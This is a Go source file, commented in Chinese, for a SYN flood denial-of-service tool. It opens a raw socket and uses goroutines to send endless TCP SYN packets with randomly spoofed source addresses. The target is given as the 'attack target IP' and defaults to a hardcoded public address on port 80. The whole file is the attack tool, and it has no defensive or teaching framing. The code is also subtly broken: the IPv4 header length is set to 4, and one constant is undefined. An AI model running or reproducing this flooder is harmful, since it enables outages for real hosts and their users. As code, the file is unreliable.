package main

import (
	"bytes"
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"syscall"
	"time"
)

func main() {
	host := flag.String("h", "8.136.86.18", "攻击目标IP")
	port := flag.Int("p", 80, "攻击目标端口")
	flag.Parse()

	if *host == "" {
		fmt.Println("参数 h 不能为空")
		return
	}

	if *port == 0 {
		fmt.Println("参数 p 不能为空")
		return
	}

	ipv4Addr := net.ParseIP(*host).To4()
	//目前没有实现ipv6
	if ipv4Addr == nil {
		fmt.Println("参数 h 不是有效的IPv4地址")
		return
	}

	handle(ipv4Addr, *port)
}

const ipv4HeaderLen = 4

func handle(ip net.IP, port int) {
	//创建原始套接字
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		fmt.Println(err)
		return
	}

	//设置IP层信息，使其能够修改IP层数据
	//err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_, 1)
	//if err != nil {
	//	fmt.Println(err)
	//	return
	//}

	for i := 0; i < 2; i++ {
		go func() {
			for {

				rand.Seed(time.Now().UnixNano())
				srcIP := net.IP(make([]byte, 4))
				binary.BigEndian.PutUint32(srcIP[0:4], uint32(rand.Intn(1<<32-1)))

				ipv4Byte, _ := getIPV4Header(srcIP, ip)
				tcpByte, _ := getTcpHeader(srcIP, ip, port)

				//var b bytes.Buffer
				//b.Write(ipv4Byte)
				//b.Write(tcpByte)
				buffs := make([]byte, 0)
				buffs = append(buffs, ipv4Byte...)
				buffs = append(buffs, tcpByte...)

				addr := syscall.SockaddrInet4{
					Port: port,
					//					Addr: ip,
				}
				copy(addr.Addr[:4], ip)
				fmt.Printf("Sendto %v %v ", ip, port)
				error := syscall.Sendto(fd, buffs, 0, &addr)
				if error != nil {
					fmt.Println("Sendto error ", error)
				}
			}
		}()
	}

	c := make(chan int, 1)
	<-c
}

func getIPV4Header(srcIp, dstIp net.IP) ([]byte, error) {

	h := &ipv4Header{
		ID:       1,
		TTL:      255,
		Protocol: syscall.IPPROTO_TCP,
		Checksum: 0, // 系统自动填充
		Src:      srcIp,
		Dst:      dstIp,
	}
	return h.Marshal()
}

func CheckSum(data []byte) uint16 {
	var (
		sum    uint32
		length int = len(data)
		index  int
	)
	for length > 1 {
		sum += uint32(data[index])<<8 + uint32(data[index+1])
		index += 2
		length -= 2
	}
	if length > 0 {
		sum += uint32(data[index])
	}
	sum += (sum >> 16)

	return uint16(^sum)
}

type PsdHeader struct {
	SrcAddr   [4]uint8
	DstAddr   [4]uint8
	Zero      uint8
	ProtoType uint8
	TcpLength uint16
}

func getTcpHeader(srcIp, dstIp net.IP, dstPort int) ([]byte, error) {
	rand.Seed(time.Now().UnixNano())

	h := &tcpHeader{
		Src:  9765,
		Dst:  dstPort,
		Seq:  690,
		Ack:  0,
		Flag: 0x02,
		Win:  65535,
		Urp:  0,
	}
	h.Src = rand.Intn(1<<16-1)%16383 + 49152
	h.Seq = rand.Intn(1<<32 - 1)
	h.Win = 2048

	//b, _ := h.Marshal()

	var (
		psdheader PsdHeader
	)
	/*填充TCP伪首部*/
	copy(psdheader.SrcAddr[:4], srcIp)
	copy(psdheader.DstAddr[:4], dstIp)
	//    psdheader.SrcAddr = [4]uint8{ srcIp[0],srcIp[1],srcIp[2],srcIp[3] }
	psdheader.Zero = 0
	psdheader.ProtoType = syscall.IPPROTO_TCP
	//    psdheader.TcpLength = uint16(unsafe.Sizeof(TCPHeader{})) + uint16(0)
	psdheader.TcpLength = uint16(20)

	/*buffer用来写入两种首部来求得校验和*/
	var (
		buffer bytes.Buffer
	)
	binary.Write(&buffer, binary.BigEndian, psdheader)
	buffs, _ := h.Marshal()
	buffer.Write(buffs)
	h.Sum = int(CheckSum(buffer.Bytes()))
	return h.Marshal()
}

type ipv4Header struct {
	Version  int    // 协议版本 4bit
	Len      int    // 头部长度 4bit
	TOS      int    // 服务类   8bit
	TotalLen int    // 包长		16bit
	ID       int    // id		8bit
	Flags    int    // flags	3bit
	FragOff  int    // 分段偏移量 13bit
	TTL      int    // 生命周期 4bit
	Protocol int    // 上层服务协议4bit
	Checksum int    // 头部校验和16bit
	Src      net.IP // 源IP  	32bit
	Dst      net.IP // 目的IP  	32bit
	Options  []byte // 选项, extension headers
}

//

// Marshal encode ipv4 header
func (h *ipv4Header) Marshal() ([]byte, error) {
	if h == nil {
		return nil, syscall.EINVAL
	}

	hdrlen := ipv4HeaderLen + len(h.Options)
	b := make([]byte, hdrlen)

	//版本和头部长度
	b[0] = byte(ipv4Version<<4 | (hdrlen >> 2 & 0x0f))
	b[1] = byte(h.TOS)

	binary.BigEndian.PutUint16(b[2:4], uint16(h.TotalLen))
	binary.BigEndian.PutUint16(b[4:6], uint16(h.ID))

	flagsAndFragOff := (h.FragOff & 0x1fff) | int(h.Flags<<13)
	binary.BigEndian.PutUint16(b[6:8], uint16(flagsAndFragOff))

	b[8] = byte(h.TTL)
	b[9] = byte(h.Protocol)

	binary.BigEndian.PutUint16(b[10:12], uint16(h.Checksum))

	if ip := h.Src.To4(); ip != nil {
		copy(b[12:16], ip[:net.IPv4len])
	}

	if ip := h.Dst.To4(); ip != nil {
		copy(b[16:20], ip[:net.IPv4len])
	} else {
		return nil, errors.New("missing address")
	}

	if len(h.Options) > 0 {
		copy(b[ipv4HeaderLen:], h.Options)
	}

	return b, nil
}

const (
	tcpHeaderLen    = 20
	tcpMaxHeaderLen = 60
)

// A tcp header
type tcpHeader struct {
	Src     int    //源端口
	Dst     int    //目的端口
	Seq     int    //序号
	Ack     int    //确认号
	Len     int    //头部长度
	Rsvd    int    //保留位
	Flag    int    //标志位
	Win     int    //窗口大小
	Sum     int    //校验和
	Urp     int    //紧急指针
	Options []byte // 选项, extension headers
}

// Marshal encode tcp header
func (h *tcpHeader) Marshal() ([]byte, error) {
	if h == nil {
		return nil, syscall.EINVAL
	}

	hdrlen := tcpHeaderLen + len(h.Options)
	b := make([]byte, hdrlen)

	//版本和头部长度
	binary.BigEndian.PutUint16(b[0:2], uint16(h.Src))
	binary.BigEndian.PutUint16(b[2:4], uint16(h.Dst))

	binary.BigEndian.PutUint32(b[4:8], uint32(h.Seq))
	binary.BigEndian.PutUint32(b[8:12], uint32(h.Ack))

	b[12] = uint8(hdrlen/4<<4 | 0)
	//TODO  Rsvd

	b[13] = uint8(h.Flag)

	binary.BigEndian.PutUint16(b[14:16], uint16(h.Win))
	binary.BigEndian.PutUint16(b[16:18], uint16(h.Sum))
	binary.BigEndian.PutUint16(b[18:20], uint16(h.Urp))

	if len(h.Options) > 0 {
		copy(b[tcpHeaderLen:], h.Options)
	}

	return b, nil
}
